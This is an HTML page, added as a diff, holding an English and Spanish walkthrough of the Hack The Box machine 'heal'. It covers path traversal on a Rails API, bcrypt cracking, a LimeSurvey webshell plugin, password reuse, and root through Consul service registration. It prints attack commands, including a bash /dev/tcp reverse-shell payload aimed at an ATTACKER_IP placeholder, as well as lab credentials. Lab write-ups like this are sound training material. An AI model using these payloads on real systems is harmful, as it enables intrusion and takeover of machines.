@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>heal | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">heal</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running multiple web services including a React frontend, a Ruby on Rails API, and a LimeSurvey instance. Initial access was achieved by exploiting a Local File Inclusion (LFI) vulnerability in the API service to extract a SQLite database containing password hashes and subsequently cracking Ralph's credentials.</p>
+                    
+                    <p>Using these credentials, I gained access to the LimeSurvey administration panel and installed a malicious plugin to achieve remote code execution as the <code>www-data</code> user. Further enumeration revealed PostgreSQL credentials that allowed lateral movement to the user <code>ron</code>.</p>
+                    
+                    <p>Privilege escalation was accomplished by discovering HashiCorp Consul running as root on localhost. By registering a malicious service check through the Consul API that executed a reverse shell payload, I obtained root access to the system.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Local File Inclusion (LFI), Ruby on Rails configuration disclosure, SQLite database extraction, password cracking with hashcat, LimeSurvey plugin upload RCE, PostgreSQL credential reuse, HashiCorp Consul service registration RCE.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image2.png"
+                        alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and additional services" />
+                </p>
+
+                <p>The scan reveals HTTP services running on port 80. I add <code>heal.htb</code> to my <code>/etc/hosts</code> file to properly resolve the domain.</p>
+
+                <h2>Web Enumeration - Multiple Virtual Hosts</h2>
+                <p>Running <code>gobuster</code> initially shows that most routes return either 503 or 404 status codes. Examining the HTML source code reveals interesting comments indicating this is a Node.js application with an Express backend:</p>
+
+                <pre><code class="language-html">&lt;!--
+This HTML file is a template.
+If you open it directly in the browser, you will see an empty page.
+You can add webfonts, meta tags, or analytics to this file.
+The build step will place the bundled scripts into the &lt;body&gt; tag.
+To begin the development, run `npm start` or `yarn start`.
+To create a production bundle, use `npm run build` or `yarn build`.
+--&gt;</code></pre>
+
+                <p>Running <code>whatweb</code> confirms this is a Node.js application with Express and nginx 1.18.0. Wappalyzer identifies the frontend as React. When attempting to interact with the main site, I notice it makes requests to <code>api.heal.htb</code>, which I add to <code>/etc/hosts</code>.</p>
+
+                <p><img src="./media/image4.png" alt="Main heal.htb website showing login errors due to missing API endpoint" /></p>
+
+                <p>The application appears to use WebSockets for communication based on the network activity visible in Chrome DevTools. I register an account and discover the site is designed for creating resumes. A "Survey" button redirects to another virtual host: <code>take-survey.heal.htb</code>, which I also add to my hosts file.</p>
+
+                <h3>Discovering LimeSurvey</h3>
+                <p>The survey subdomain reveals a LimeSurvey installation. Running <code>whatweb</code> provides additional information:</p>
+
+                <pre><code class="language-plaintext">http://take-survey.heal.htb/ [200 OK] Cookies[LS-ZNIDJBOXUNKXWTIP], Country[RESERVED][ZZ], 
+Email[ralph@heal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+HttpOnly[LS-ZNIDJBOXUNKXWTIP], IP[10.10.11.46], JQuery, Lime-Survey, 
+MetaGenerator[LimeSurvey http://www.limesurvey.org], Script[text/javascript], 
+Title[Survey], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre>
+
+                <p>Wappalyzer identifies the PHP Yii framework in use. After spending time investigating recent LimeSurvey CVEs without success, I return to examining the API subdomain.</p>
+
+                <h2>Local File Inclusion Discovery</h2>
+                <p>While testing <code>api.heal.htb</code>, I discover a Local File Inclusion (LFI) vulnerability in the download endpoint:</p>
+
+                <pre><code class="language-bash">http://api.heal.htb/download?filename=../../../../../../../../../../../../../../../../etc/passwd</code></pre>
+
+                <p>This allows me to read arbitrary files from the system. Examining <code>/etc/passwd</code> reveals three potential user accounts:</p>
+
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
+ron:x:1001:1001:,,,:/home/ron:/bin/bash</code></pre>
+
+                <p>Investigating the API technology stack with <code>whatweb</code> reveals it's running Ruby on Rails 7.1.4 with Ruby 3.3.5.</p>
+
+                <h2>Ruby on Rails Configuration Extraction</h2>
+                <p>Understanding the typical Ruby on Rails project structure, I use the LFI to extract sensitive configuration files. The most critical files are <code>config/master.key</code> and <code>config/credentials.yml.enc</code>, located two directories behind the LFI path.</p>
+
+                <p>Using the master key and Ruby's <code>activesupport</code> library, I decrypt the credentials file and obtain:</p>
+
+                <pre><code class="language-json">{
+  "secret_key_base": "7c54b3ab1c9f9d5037c8f8c856b4be85f4eca365430232a6743965665fbeec9c30e86dad314aa54ed90986223bc7841c89c2442a0e7e6b546a9366f4d3d8dc2d"
+}</code></pre>
+
+                <p>However, examining the routes configuration reveals limited attack surface through the API:</p>
+
+                <pre><code class="language-ruby">get '/', to: 'rails/welcome#index'
+post 'signup', to: 'authentication#signup'
+post 'signin', to: 'authentication#signin'
+get 'profile', to: 'authentication#profile'
+get 'resume', to: 'authentication#resume'
+delete 'logout', to: 'authentication#logout'
+post 'exports', to: 'exports#create'
+get 'download', to: 'exports#download'</code></pre>
+
+                <h3>Extracting the SQLite Database</h3>
+                <p>In <code>config/database.yml</code>, I find that the application uses SQLite3 with the database located at <code>storage/development.sqlite3</code>. I extract it using curl with a valid authentication token:</p>
+
+                <pre><code class="language-bash">curl http://api.heal.htb//download?filename=../../storage/development.sqlite3 \
+  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' \
+  --output ruby.sqlite3</code></pre>
+
+                <p>Examining the database reveals Ralph's credentials with a bcrypt hash:</p>
+
+                <pre><code class="language-plaintext">ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG</code></pre>
+
+                <h3>Cracking the Password Hash</h3>
+                <p>I use hashcat with the rockyou wordlist to crack the bcrypt hash:</p>
+
+                <pre><code class="language-bash">hashcat -m 3200 -a 0 -o found.txt hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>This yields the credentials: <code>ralph:147258369</code></p>
+
+                <p>While SSH access fails with these credentials, I can successfully authenticate to both <code>heal.htb</code> and the LimeSurvey admin panel at <code>take-survey.heal.htb</code>.</p>
+
+                <h2>Initial Access - LimeSurvey Plugin Upload</h2>
+                <p><img src="./media/image1.png" alt="LimeSurvey administration panel after successful login" /></p>
+
+                <p>Once authenticated to LimeSurvey, I discover the configuration section allows plugin installation, similar to CMS platforms like WordPress or Joomla. I attempt to install a webshell plugin from <a href="https://github.com/p0dalirius/LimeSurvey-webshell-plugin">https://github.com/p0dalirius/LimeSurvey-webshell-plugin</a>, but encounter "request entity too large" errors.</p>
+
+                <p>After removing unnecessary files from the plugin zip (README, .github directory with video files), I still encounter XML parsing errors. Eventually, I create a minimal custom plugin based on examples from the official LimeSurvey forum and successfully achieve remote code execution:</p>
+
+                <pre><code class="language-bash">curl -X POST 'http://take-survey.heal.htb/upload/plugins/exampleSettings/exampleSettings.php' \
+  --data "action=exec&cmd=id"</code></pre>
+
+                <pre><code class="language-json">{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"}</code></pre>
+
+                <p>I establish a reverse shell and gain access as the <code>www-data</code> user. Testing Ralph's cracked password with <code>su</code> fails.</p>
+
+                <h2>Lateral Movement - PostgreSQL Credential Reuse</h2>
+                <p>Enumerating the system with <code>ss -tuln</code> reveals multiple open ports:</p>
+
+                <p><img src="./media/image3.png" alt="Output of ss -tuln showing multiple open local ports including PostgreSQL on 5432" /></p>
+
+                <p>In the LimeSurvey configuration file at <code>limesurvey/application/config/config.php</code>, I discover PostgreSQL credentials:</p>
+
+                <pre><code class="language-php">connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',</code></pre>
+
+                <p>The PostgreSQL database only contains Ralph's account with the already-known password <code>147258369</code>. However, testing the database password <code>AdmiDi0_pA$$w0rd</code> with both user accounts reveals it works for the <code>ron</code> user:</p>
+
+                <pre><code class="language-bash">su ron
+# Password: AdmiDi0_pA$$w0rd</code></pre>
+
+                <p>This grants me access as Ron and allows me to retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - HashiCorp Consul Exploitation</h2>
+                <p>While examining running processes with <code>ps -faux | grep root</code>, I notice an interesting service running as root:</p>
+
+                <pre><code class="language-plaintext">root 1812 0.6 2.5 1359524 102584 ? Ssl Oct04 4:25 \
+  /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 \
+  -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d</code></pre>
+
+                <p>Consul is a HashiCorp tool for service discovery, configuration, and orchestration. Since it's bound to localhost, I establish SSH port forwarding to access it:</p>
+
+                <pre><code class="language-bash">ssh ron@10.10.11.46 -L 8500:localhost:8500</code></pre>
+
+                <p><img src="./media/image5.png" alt="Consul web UI accessible through SSH port forwarding" /></p>
+
+                <p>Checking the version reveals:</p>
+
+                <pre><code class="language-bash">consul version
+Consul v1.19.2
+Revision 048f1936
+Build Date 2024-08-27T16:06:44Z</code></pre>
+
+                <p>While no direct CVEs apply to this version, I discover a technique for achieving command execution through Consul's service registration API. I find a proof-of-concept exploit at <a href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a>.</p>
+
+                <h3>Understanding the Consul Exploitation</h3>
+                <p>The exploit works by registering a malicious service with Consul through the <code>/v1/agent/service/register</code> endpoint. The service includes a health check that executes arbitrary commands. Since Consul is running as root, any commands in the health check script execute with root privileges.</p>
+
+                <p>The payload structure looks like this:</p>
+
+                <pre><code class="language-json">{
+  "Address": "127.0.0.1",
+  "check": {
+    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],
+    "interval": "10s",
+    "Timeout": "864000s"
+  },
+  "ID": "malicious-service",
+  "Name": "malicious-service",
+  "Port": 80
+}</code></pre>
+
+                <p>I set up a netcat listener and execute the exploit:</p>
+
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <pre><code class="language-bash">python3 exploit.py localhost 8500 10.10.16.6 443 5555</code></pre>
+
+                <pre><code class="language-plaintext">[+] Request sent successfully, check your listener</code></pre>
+
+                <p>The Consul service check executes every 10 seconds, triggering the reverse shell payload and granting me a root shell:</p>
+
+                <pre><code class="language-bash">whoami
+root</code></pre>
+
+                <p>With root access obtained, I can retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba múltiples servicios web incluyendo un frontend React, una API Ruby on Rails y una instancia de LimeSurvey. El acceso inicial se consiguió explotando una vulnerabilidad de Local File Inclusion (LFI) en el servicio API para extraer una base de datos SQLite que contenía hashes de contraseñas y posteriormente crackeando las credenciales de Ralph.</p>
+                    
+                    <p>Usando estas credenciales, obtuve acceso al panel de administración de LimeSurvey e instalé un plugin malicioso para conseguir ejecución remota de código como usuario <code>www-data</code>. Una enumeración adicional reveló credenciales de PostgreSQL que permitieron movimiento lateral al usuario <code>ron</code>.</p>
+                    
+                    <p>La escalada de privilegios se logró descubriendo HashiCorp Consul ejecutándose como root en localhost. Registrando un servicio malicioso a través de la API de Consul que ejecutaba un payload de reverse shell, obtuve acceso root al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Local File Inclusion (LFI), divulgación de configuración de Ruby on Rails, extracción de base de datos SQLite, crackeo de contraseñas con hashcat, RCE mediante subida de plugin en LimeSurvey, reutilización de credenciales de PostgreSQL, RCE mediante registro de servicios en HashiCorp Consul.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image2.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80 y servicios adicionales" />
+                </p>
+
+                <p>El escaneo revela servicios HTTP ejecutándose en el puerto 80. Añado <code>heal.htb</code> a mi archivo <code>/etc/hosts</code> para resolver correctamente el dominio.</p>
+
+                <h2>Enumeración Web - Múltiples Virtual Hosts</h2>
+                <p>Ejecutando <code>gobuster</code> inicialmente muestra que la mayoría de las rutas devuelven códigos de estado 503 o 404. Examinando el código fuente HTML revelo comentarios interesantes que indican que esta es una aplicación Node.js con un backend Express:</p>
+
+                <pre><code class="language-html">&lt;!--
+This HTML file is a template.
+If you open it directly in the browser, you will see an empty page.
+You can add webfonts, meta tags, or analytics to this file.
+The build step will place the bundled scripts into the &lt;body&gt; tag.
+To begin the development, run `npm start` or `yarn start`.
+To create a production bundle, use `npm run build` or `yarn build`.
+--&gt;</code></pre>
+
+                <p>Ejecutar <code>whatweb</code> confirma que es una aplicación Node.js con Express y nginx 1.18.0. Wappalyzer identifica el frontend como React. Al intentar interactuar con el sitio principal, noto que hace peticiones a <code>api.heal.htb</code>, que añado a <code>/etc/hosts</code>.</p>
+
+                <p><img src="./media/image4.png" alt="Sitio web principal heal.htb mostrando errores de login debido al endpoint API faltante" /></p>
+
+                <p>La aplicación parece usar WebSockets para comunicación basándome en la actividad de red visible en Chrome DevTools. Registro una cuenta y descubro que el sitio está diseñado para crear currículums. Un botón "Survey" redirige a otro virtual host: <code>take-survey.heal.htb</code>, que también añado a mi archivo hosts.</p>
+
+                <h3>Descubriendo LimeSurvey</h3>
+                <p>El subdominio de encuestas revela una instalación de LimeSurvey. Ejecutar <code>whatweb</code> proporciona información adicional:</p>
+
+                <pre><code class="language-plaintext">http://take-survey.heal.htb/ [200 OK] Cookies[LS-ZNIDJBOXUNKXWTIP], Country[RESERVED][ZZ], 
+Email[ralph@heal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
+HttpOnly[LS-ZNIDJBOXUNKXWTIP], IP[10.10.11.46], JQuery, Lime-Survey, 
+MetaGenerator[LimeSurvey http://www.limesurvey.org], Script[text/javascript], 
+Title[Survey], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre>
+
+                <p>Wappalyzer identifica el uso del framework PHP Yii. Después de pasar tiempo investigando CVEs recientes de LimeSurvey sin éxito, vuelvo a examinar el subdominio API.</p>
+
+                <h2>Descubrimiento de Local File Inclusion</h2>
+                <p>Mientras pruebo <code>api.heal.htb</code>, descubro una vulnerabilidad de Local File Inclusion (LFI) en el endpoint de descarga:</p>
+
+                <pre><code class="language-bash">http://api.heal.htb/download?filename=../../../../../../../../../../../../../../../../etc/passwd</code></pre>
+
+                <p>Esto me permite leer archivos arbitrarios del sistema. Examinando <code>/etc/passwd</code> revela tres cuentas de usuario potenciales:</p>
+
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
+ron:x:1001:1001:,,,:/home/ron:/bin/bash</code></pre>
+
+                <p>Investigando la pila tecnológica de la API con <code>whatweb</code> revela que ejecuta Ruby on Rails 7.1.4 con Ruby 3.3.5.</p>
+
+                <h2>Extracción de Configuración de Ruby on Rails</h2>
+                <p>Entendiendo la estructura típica de proyectos Ruby on Rails, uso el LFI para extraer archivos de configuración sensibles. Los archivos más críticos son <code>config/master.key</code> y <code>config/credentials.yml.enc</code>, localizados dos directorios detrás de la ruta del LFI.</p>
+
+                <p>Usando la clave maestra y la librería <code>activesupport</code> de Ruby, desencripto el archivo de credenciales y obtengo:</p>
+
+                <pre><code class="language-json">{
+  "secret_key_base": "7c54b3ab1c9f9d5037c8f8c856b4be85f4eca365430232a6743965665fbeec9c30e86dad314aa54ed90986223bc7841c89c2442a0e7e6b546a9366f4d3d8dc2d"
+}</code></pre>
+
+                <p>Sin embargo, examinando la configuración de rutas revela una superficie de ataque limitada a través de la API:</p>
+
+                <pre><code class="language-ruby">get '/', to: 'rails/welcome#index'
+post 'signup', to: 'authentication#signup'
+post 'signin', to: 'authentication#signin'
+get 'profile', to: 'authentication#profile'
+get 'resume', to: 'authentication#resume'
+delete 'logout', to: 'authentication#logout'
+post 'exports', to: 'exports#create'
+get 'download', to: 'exports#download'</code></pre>
+
+                <h3>Extrayendo la Base de Datos SQLite</h3>
+                <p>En <code>config/database.yml</code>, encuentro que la aplicación usa SQLite3 con la base de datos localizada en <code>storage/development.sqlite3</code>. La extraigo usando curl con un token de autenticación válido:</p>
+
+                <pre><code class="language-bash">curl http://api.heal.htb//download?filename=../../storage/development.sqlite3 \
+  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' \
+  --output ruby.sqlite3</code></pre>
+
+                <p>Examinando la base de datos revelo las credenciales de Ralph con un hash bcrypt:</p>
+
+                <pre><code class="language-plaintext">ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG</code></pre>
+
+                <h3>Crackeando el Hash de Contraseña</h3>
+                <p>Uso hashcat con la wordlist rockyou para crackear el hash bcrypt:</p>
+
+                <pre><code class="language-bash">hashcat -m 3200 -a 0 -o found.txt hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Esto produce las credenciales: <code>ralph:147258369</code></p>
+
+                <p>Aunque el acceso SSH falla con estas credenciales, puedo autenticarme exitosamente tanto en <code>heal.htb</code> como en el panel de administración de LimeSurvey en <code>take-survey.heal.htb</code>.</p>
+
+                <h2>Acceso Inicial - Subida de Plugin en LimeSurvey</h2>
+                <p><img src="./media/image1.png" alt="Panel de administración de LimeSurvey después de login exitoso" /></p>
+
+                <p>Una vez autenticado en LimeSurvey, descubro que la sección de configuración permite instalación de plugins, similar a plataformas CMS como WordPress o Joomla. Intento instalar un plugin de webshell desde <a href="https://github.com/p0dalirius/LimeSurvey-webshell-plugin">https://github.com/p0dalirius/LimeSurvey-webshell-plugin</a>, pero encuentro errores "request entity too large".</p>
+
+                <p>Después de eliminar archivos innecesarios del zip del plugin (README, directorio .github con archivos de vídeo), todavía encuentro errores de parseo XML. Eventualmente, creo un plugin personalizado mínimo basado en ejemplos del foro oficial de LimeSurvey y consigo exitosamente ejecución remota de código:</p>
+
+                <pre><code class="language-bash">curl -X POST 'http://take-survey.heal.htb/upload/plugins/exampleSettings/exampleSettings.php' \
+  --data "action=exec&cmd=id"</code></pre>
+
+                <pre><code class="language-json">{"stdout":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","stderr":"","exec":"id"}</code></pre>
+
+                <p>Establezco una reverse shell y obtengo acceso como usuario <code>www-data</code>. Probar la contraseña crackeada de Ralph con <code>su</code> falla.</p>
+
+                <h2>Movimiento Lateral - Reutilización de Credenciales de PostgreSQL</h2>
+                <p>Enumerando el sistema con <code>ss -tuln</code> revela múltiples puertos abiertos:</p>
+
+                <p><img src="./media/image3.png" alt="Salida de ss -tuln mostrando múltiples puertos locales abiertos incluyendo PostgreSQL en el 5432" /></p>
+
+                <p>En el archivo de configuración de LimeSurvey en <code>limesurvey/application/config/config.php</code>, descubro credenciales de PostgreSQL:</p>
+
+                <pre><code class="language-php">connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',</code></pre>
+
+                <p>La base de datos PostgreSQL solo contiene la cuenta de Ralph con la contraseña ya conocida <code>147258369</code>. Sin embargo, probar la contraseña de la base de datos <code>AdmiDi0_pA$$w0rd</code> con ambas cuentas de usuario revela que funciona para el usuario <code>ron</code>:</p>
+
+                <pre><code class="language-bash">su ron
+# Contraseña: AdmiDi0_pA$$w0rd</code></pre>
+
+                <p>Esto me otorga acceso como Ron y me permite recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Explotación de HashiCorp Consul</h2>
+                <p>Mientras examino procesos en ejecución con <code>ps -faux | grep root</code>, noto un servicio interesante ejecutándose como root:</p>
+
+                <pre><code class="language-plaintext">root 1812 0.6 2.5 1359524 102584 ? Ssl Oct04 4:25 \
+  /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 \
+  -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d</code></pre>
+
+                <p>Consul es una herramienta de HashiCorp para descubrimiento de servicios, configuración y orquestación. Como está vinculado a localhost, establezco port forwarding SSH para acceder a él:</p>
+
+                <pre><code class="language-bash">ssh ron@10.10.11.46 -L 8500:localhost:8500</code></pre>
+
+                <p><img src="./media/image5.png" alt="Interfaz web de Consul accesible mediante port forwarding SSH" /></p>
+
+                <p>Comprobando la versión revela:</p>
+
+                <pre><code class="language-bash">consul version
+Consul v1.19.2
+Revision 048f1936
+Build Date 2024-08-27T16:06:44Z</code></pre>
+
+                <p>Aunque no hay CVEs directos que apliquen a esta versión, descubro una técnica para conseguir ejecución de comandos a través de la API de registro de servicios de Consul. Encuentro una prueba de concepto del exploit en <a href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a>.</p>
+
+                <h3>Entendiendo la Explotación de Consul</h3>
+                <p>El exploit funciona registrando un servicio malicioso con Consul a través del endpoint <code>/v1/agent/service/register</code>. El servicio incluye una comprobación de salud que ejecuta comandos arbitrarios. Como Consul se ejecuta como root, cualquier comando en el script de comprobación de salud se ejecuta con privilegios root.</p>
+
+                <p>La estructura del payload es así:</p>
+
+                <pre><code class="language-json">{
+  "Address": "127.0.0.1",
+  "check": {
+    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/IP_ATACANTE/PUERTO 0>&1"],
+    "interval": "10s",
+    "Timeout": "864000s"
+  },
+  "ID": "servicio-malicioso",
+  "Name": "servicio-malicioso",
+  "Port": 80
+}</code></pre>
+
+                <p>Configuro un listener de netcat y ejecuto el exploit:</p>
+
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <pre><code class="language-bash">python3 exploit.py localhost 8500 10.10.16.6 443 5555</code></pre>
+
+                <pre><code class="language-plaintext">[+] Request sent successfully, check your listener</code></pre>
+
+                <p>La comprobación de servicio de Consul se ejecuta cada 10 segundos, desencadenando el payload de reverse shell y otorgándome una shell root:</p>
+
+                <pre><code class="language-bash">whoami
+root</code></pre>
+
+                <p>Con acceso root obtenido, puedo recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
